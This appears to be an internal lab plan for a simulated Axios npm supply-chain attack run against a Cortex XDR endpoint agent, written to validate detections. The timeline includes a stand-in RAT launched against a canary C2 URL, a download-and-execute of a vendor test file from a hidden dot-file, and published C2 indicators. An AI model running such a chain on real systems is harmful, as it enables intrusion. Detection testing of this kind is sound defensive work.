# Lab run plan — Unit 42 backlog: SIM-KOI-012 (and why SIM-CDR-029 gets none)

**Scenario:** SIM-KOI-012, the Axios npm supply chain's Linux second stage
(card TTP-2026-0203), on branch `feature/scenarios-unit42-backlog`.
**Target:** the Cortex XDR agent on `pov-target-01` (lab VM, Ubuntu 24.04,
agent 9.4.0.470, policy `SEBC-FY25-LAB-LinuxServerPolicy`, report mode),
beacon `pov-target-01-4dcdce` (server `http://192.168.1.105:8888`), tenant
`deathstar`.
**Status:** authored, not run. ***tenant-verified is 0.*** Nothing below runs
against the VM without Henry's explicit OK, given for that run.
**SIM-CDR-029** (Blinding the Watchmen) is authored-only and has no lab run;
see section 8.

## Executive summary

This plan covers one controlled run of a simulated software supply-chain
compromise on the lab's Linux endpoint. A poisoned developer library leaves a
remote-access tool on the machine, and the tool then downloads and runs Palo
Alto Networks' official malware test file. The run proves something only if
the endpoint agent classifies that file as malicious and the alert opens or
joins an incident. Everything else the run produces is supporting evidence
that never raises the score. Two things must be managed. The agent suppresses
repeat verdicts on the same file for an hour, so this run has to be spaced at
least an hour from the other lab test that uses the file. And the stronger
result, two alerts grouped in one incident, needs the operator to install one
correlation rule before the run. Recommended action: install the rule, confirm
the spacing, approve one run, and read it against section 5. The companion
cloud-logging scenario is authored only and gets no lab run, because the lab
has no cloud account. No result here has been verified against a live tenant.

## Technical detail

### 0. What this run inherits from the lab (read back 2026-11-11, read-only)

- **Grouping needs Medium+.** Only Medium-or-higher issues create a case or
  join one. Low Analytics BIOCs never do.
- **The only Medium+ verdicts this lab has produced** come from executing the
  WildFire test ELF: `Local Analysis Malware` (HIGH, detection method `TRAPS`)
  when it ran from a shell (draft `b83b956e`, case 51877; SIM-EDR-023 run
  `fac6e8d5`, case 51896, reconcile MTTD 46 s), and `WildFire Malware`
  (MEDIUM) on a re-execution from SIM-EDR-023's cron chain, which joined case
  51896.
- **Not yet observed:** the Local Analysis verdict when **python3** starts the
  ELF from a hidden six-character dot-file, which is how SIM-KOI-012's
  `peinject` verb runs it. This run is the first test of that variant.
- **Local Analysis is deduplicated for one hour per file.** Each download of
  the test ELF returned a different SHA256 in the author's container runs, so
  whether the dedup carries from one run to the next is unverified. The
  spacing rule in section 2 is kept regardless.
- **Steps are 40 s apart** (back-to-back steps lost telemetry; spaced steps
  did not). The tenant lists 0 custom BIOC rules and no custom correlation
  rules: an operator-installed rule fires only once it is installed.
- **Detection Accuracy counts only alert-backed observations.** An XQL row
  that passes Tier-2 verify does not raise it (SIM-EDR-023's run read 14.3%
  with both XQL rows passing).

### 1. Before the run, in this order

1. **Load the scenario.** The SimCore on :8888 must carry SIM-KOI-012:
   `curl -s -o /dev/null -w '%{http_code}\n' http://localhost:8888/api/scenarios/SIM-KOI-012`
   must print `200`. If it prints `404`, rebuild SimCore from
   `feature/scenarios-unit42-backlog` with `scripts/dev-up.sh` (reuse the root
   `.env` so the vault and the `deathstar` credential decrypt; keep the image
   tag the cortex-mcp `run.sh` expects).
2. **Confirm the beacon.**
   `curl -s http://localhost:8888/api/agents | jq '.agents[] | select(.agent_id=="pov-target-01-4dcdce") | {status, interpreters}'`
   must show `online` and `python` among the interpreters. Steps 01 and 03
   declare `requires_interpreters: [python]`; curl and coreutils are stock.
   node and npm are not needed.
3. **Check the spacing** (section 2).
4. **Install CR-KOI-0012 (optional, but it sets the ceiling).** Copy the XQL
   from TTP-2026-0203 `detections.correlation_rules[0].logic` (also exported
   to `detection_scanner/exports/correlation/TTP-2026-0203.json`). Alert name
   **exactly** `KOI-012 Axios Postinstall Dropper To Python RAT Payload
   Execution`; severity **Medium**; **Scheduled every 10 minutes, query time
   frame 1 hour**; alert field mapping `agent_hostname` → Host Name and
   `agent_id` → Agent ID; MITRE tag **T1219 only** (a tag shared with an XQL
   row's step lets the correlation issue credit that row). The rule's XQL has
   **not been run in any tenant**: run it once read-only in XQL search to
   confirm it parses before saving it. Without the rule the best possible
   result is 12.5% (section 5).
5. **Check the clock.** `POST /api/connectors/xsiam_tenant/preflight` reports
   clock skew within a few seconds.
6. **Egress.** Step-06 makes the scenario's one real download:
   `https://wildfire.paloaltonetworks.com/publicapi/test/elf`, the same URL
   SIM-EDR-023 step-01 fetched on this host. Every other network call goes to
   `axios-c2.cortexsim-canary.invalid` with a 3 s bound and never resolves.
   The real C2 (`sfrclak.com`, `142.11.206.73`, port 8000) is never contacted.
7. **Ask Henry for the OK** for this run.

### 2. Spacing against SIM-EDR-023 (one-hour Local Analysis dedup)

SIM-EDR-023 executes the test ELF at step-02 (about 0:40 after launch). Its
step-03 (about 1:20) plants a cron job that re-runs the ELF every 5 minutes
until a deadline 2700 s (45 min) after step-03. SIM-KOI-012 executes the ELF
at step-06, about 3½ minutes after launch.

| Order | Rule |
|---|---|
| SIM-EDR-023 then SIM-KOI-012 | launch SIM-KOI-012 at least **1 h after SIM-EDR-023's last cron re-execution**: about **1 h 50 min after SIM-EDR-023's launch** if its foothold expired on schedule |
| SIM-KOI-012 then SIM-EDR-023 | launch SIM-EDR-023 at least **1 h 05 min after SIM-KOI-012's launch** (one hour after its step-06) |
| SIM-KOI-012 twice | the same 1 h 05 min. It also keeps the first run's events out of CR-KOI-0012's one-hour time frame, where they would raise the issue again and be credited to the second run |

The last execution on record is SIM-EDR-023 run `fac6e8d5` (launched
2026-11-11 16:24Z, re-run window closing about 17:11Z). Confirm nothing ran
since, read-only:

```
dataset = xdr_data
| filter agent_hostname = "pov-target-01"
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_path = "/var/tmp/.cortexsim-ice/kworker-ice" or action_process_image_path ~= "^/var/tmp/[.]cortexsim-axios/tmp/[.][A-Za-z0-9]{6}$"
| filter timestamp_diff(current_time(), _time, "SECOND") < 7200
| comp max(_time) as last_exec, count() as execs by action_process_image_path
```

Zero rows means no test-ELF execution by either scenario in the last two
hours. Also read `get_issues` (Cortex MCP oracle) for `Local Analysis
Malware` / `WildFire Malware` on `pov-target-01` in the last hour; any hit
means wait.

### 3. Launch

```bash
curl -s -X POST http://localhost:8888/api/runs -H 'content-type: application/json' -d '{"scenario_id":"SIM-KOI-012","mode":"pull","target_agent_id":"pov-target-01-4dcdce"}'
```

Identity is `root` (the scenario's default and only option). No `consent`
block: the scenario wires no `external_tools` adapter. No shelf artifact and no
runtime install. Pull mode, report-mode policy. In block mode step-06 exits
non-zero when the agent stops the payload and step-07 is not reached; that run
is outside this plan.

Expected timeline. The times come from the step sleeps; the author's
container run of the bundle took 247 s end to end, longest step 43 s. Not
measured on the VM.

| t (approx.) | Step | What runs |
|---|---|---|
| 0:00 | step-01 | poisoned `node_modules/{axios,plain-crypto-js}` tree written under `/var/tmp/.cortexsim-axios/proj`; python3 decodes the `setup.js` string table |
| 0:40 | step-02 | curl POSTs `packages.npm.org/product2` to the `.invalid` canary (fails); RAT stand-in written to `/var/tmp/.cortexsim-axios/tmp/ld.py` |
| 1:20 | step-03 | `nohup python3 …/tmp/ld.py http://axios-c2.cortexsim-canary.invalid:8000/6202033`; FirstInfo + BaseInfo queued; RAT self-expires 15 min later |
| 2:00 | step-04 | `rm` setup.js; `mv` package.md over package.json |
| 2:45 | step-05 | RAT tasking: `rundir`, then `runscript` (`id; uname -a; ls -la …`) |
| 3:30 | step-06 | WildFire test ELF downloaded; RAT `peinject` writes it to `…/tmp/.<6 chars>`, chmod 0777, runs it → **Local Analysis Malware expected** |
| 4:15 | step-07 | RAT `kill`: it acknowledges and exits; nothing left running |
| ~4:30 | — | run `complete` |
| ≤ ~15:00 | — | CR-KOI-0012's first scheduled run after step-06, if installed |

Step-06 exit codes: 0 when the payload ran; 126 or 127 when it did not start
(blocked, noexec, wrong architecture); 128 + N when it was killed by signal N.
None is masked.

### 4. What the tenant must show

Window: the run's `started_at` to +60 min. All reads are read-only (Cortex MCP
oracle, or the SimCore read-back in step 4 below).

1. **The proof: a Medium+ verdict on the peinject ELF.** `get_issues` on host
   `pov-target-01` in the window. Do not filter on `detection.method`: the
   method of a `WildFire Malware` issue has not been recorded in this lab.
   - **`Local Analysis Malware`**, HIGH, method `TRAPS`, action REPORTED, on
     a file at `/var/tmp/.cortexsim-axios/tmp/.<6 alphanumerics>`, observed
     after step-06 started, **carrying a case id**. This is the row
     `prevention-local-analysis-malware` (step-06, `outcome: detect`).
   - Or **`WildFire Malware`**, MEDIUM, on the same file. That is also a
     Medium+ verdict on the payload, and it should create or join a case. Read
     it by hand: under the matcher's rules it shares one evidence token with
     the row (two are needed) and does not carry the card's name, so
     reconcile credits it only if its MITRE technique equals the step's
     (T1105). Not observed.
2. **The correlation (only if installed).** `KOI-012 Axios Postinstall
   Dropper To Python RAT Payload Execution`, MEDIUM, method `CORRELATION`,
   carrying **the same case id** as the verdict through its mapped Host Name /
   Agent ID. Grouping has not been verified for this rule.
3. **The telemetry under `/var/tmp/.cortexsim-axios`.** Every step writes
   there, so a step with no rows is a telemetry gap, not a Cortex miss:

   ```
   dataset = xdr_data
   | filter agent_hostname = "pov-target-01"
   | filter timestamp_diff(current_time(), _time, "SECOND") < 3600
   | filter action_file_path contains "/var/tmp/.cortexsim-axios" or action_process_image_path contains "/var/tmp/.cortexsim-axios" or action_process_image_command_line contains "/var/tmp/.cortexsim-axios" or actor_process_command_line contains "/var/tmp/.cortexsim-axios"
   | comp count() as events by event_type, event_sub_type
   ```

   Expected: `FILE` rows (`FILE_CREATE_NEW`, `FILE_WRITE`, `FILE_REMOVE`) and
   `PROCESS` / `PROCESS_START` rows. `FILE_DIR_CREATE` and `FILE_RENAME` have
   not been seen in this lab; the declared rows do not need them. The six
   per-row `verification_xql` queries in the scenario are the scored form of
   this check.
4. **Record it in SimCore.**
   - `POST /api/runs/{run_id}/reconcile?connector=xsiam` pulls the alerts and
     marks the alert-backed rows observed.
   - `POST /api/runs/{run_id}/verify` runs the six XQL rows' `verification_xql`.
     It looks back one hour from when it runs: call it within the hour.
   - Both are outbound **reads**. Nothing is written to the tenant.

The eight step-detections:

| Step | Detection | Type | Counts toward Detection Accuracy |
|---|---|---|---|
| step-01 | `xql-koi-012-plain-crypto-js-tree-written-and-setup-js-strings-decoded` | XQL | no (Tier-2 verify only) |
| step-02 | `xql-koi-012-first-stage-fetch-and-rat-script-written-at-mirrored-tmp-ld-py` | XQL | no |
| step-03 | `xql-koi-012-python-rat-launched-with-c2-url-argument` | XQL | no |
| step-04 | `xql-koi-012-decoy-manifest-renamed-over-package-json` | XQL | no |
| step-05 | `xql-koi-012-rat-runscript-spawns-shell-child` | XQL | no |
| step-06 | `prevention-local-analysis-malware` | Prevention (`outcome: detect`) | **yes**, built-in |
| step-06 | `xql-koi-012-rat-peinject-runs-hidden-dot-file` | XQL | no |
| step-07 | `CR-KOI-0012` | Correlation | **yes**, only if installed |

### 5. Reading the verdict: 12.5% and 25%

Detection Accuracy is observed alert-backed rows over the eight rows that ran.
The threshold is **≥ 12.5%**: the built-in verdict alone, 1 of 8. The ceiling
is **25%**, 2 of 8, reached only when CR-KOI-0012 is installed and fires. The
six XQL rows never raise it.

| Local Analysis row | CR-KOI-0012 row | Detection Accuracy | Read as |
|---|---|---|---|
| observed | observed | 25.0% | the full result: verdict and correlation, which should share one case |
| observed | missed or not installed | 12.5% | PASS bar met. A missing rule shows as one missed row, not a failed run |
| missed | observed | 12.5% | the number meets the bar, but the verdict the bar was set for did not arrive. Read the rows, not the percentage |
| missed | missed | 0% | FAIL. Before calling it a Cortex miss, check step-06's exit code (126 = not executed) and the step-06 rows of the section-4 query |

Two more things about the number:

- **A PASS reads `not_applicable`.** TC-SCA-01, the bound index row, has
  `is_scoreable: false` (threshold "Qualitative pass"), so a machine PASS is
  recorded as evidence, not as a scored pass. A FAIL stands.
- **MTTD reads minutes, not seconds.** Result rows are stamped `executed_at`
  at launch and the payload runs at step-06, so the Local Analysis row's MTTD
  will read about 3½ to 4½ minutes, not the 46 s SIM-EDR-023 showed.

### 6. Expected, not scored

- All six XQL rows pass Tier-2 verify.
- Possible Low issues, never in a case: `UNIX LOLBIN process connected to a
  rare external host` (curl to `wildfire.paloaltonetworks.com` in step-06;
  rarity-based, and that host was already reached on 2026-11-11, so it may not
  fire) and `Uncommon Linux shell command execution`.
- The card's five `purpose: hunt` queries (three of them Unit 42's published
  hunts), the published IOCs and the three operator-installable BIOCs stay on
  the card. None is an expectation of this run.

### 7. Cleanup (the beacon does not run `cleanup.commands`)

Step-07 ends the RAT, and it would expire on its own 15 minutes after step-03.
The sandbox `/var/tmp/.cortexsim-axios` stays on disk, including two copies of
the test ELF (`c2/payload.bin` and `tmp/.<6 chars>`), until the next run's
step-01 or the cleanup removes it. After the read-back, from Henry's terminal
on the VM or as a one-step `identity: root` draft through the beacon:

```bash
sudo sh -c 'if [ -f /var/tmp/.cortexsim-axios/run/ld.pid ] && grep -q cortexsim-axios "/proc/$(cat /var/tmp/.cortexsim-axios/run/ld.pid)/cmdline" 2>/dev/null; then kill "$(cat /var/tmp/.cortexsim-axios/run/ld.pid)" 2>/dev/null; fi; rm -rf /var/tmp/.cortexsim-axios'
```

These are the scenario's own `cleanup.commands`.

### 8. SIM-CDR-029 — authored-only, no lab run

Henry's decision of 2026-11-11 ("Yes, separate branch (Recommended)"): Blinding
the Watchmen is built on its own branch, `feature/scenarios-unit42-cloud-logging`,
**authored-only**, with Universal Bucket Hijacking as one leg. The emitter
presets it needs are on `feature/api-cloud-audit-emitter-presets`
(`cloud_audit_emitter`, eight logging-service presets). On 2026-11-11 no file
on any branch carries the id SIM-CDR-029; it is the next free CDR id.

No lab run is planned for it, and none could prove it:

- The lab has no AWS or GCP account. The scenario's legs are synthetic audit
  records POSTed to an operator collector, not cloud API calls.
- Collector records do not arm the vendor cloud-logging analytics alerts the
  post maps to; those need a natively onboarded audit source and a training
  period. No collector dataset is registered for the plugin yet.
- With `iterations` > 1, the `log_destination_delete`, `log_router_delete`,
  `log_router_create` and `stream_bucket_delete` presets repeat a delete or
  create of one named resource, which no tenant could produce. Author those
  steps with `iterations: 1`.

***tenant-verified is 0*** for SIM-KOI-012 and for SIM-CDR-029. Authored is not
proven, and this plan does not change either number.
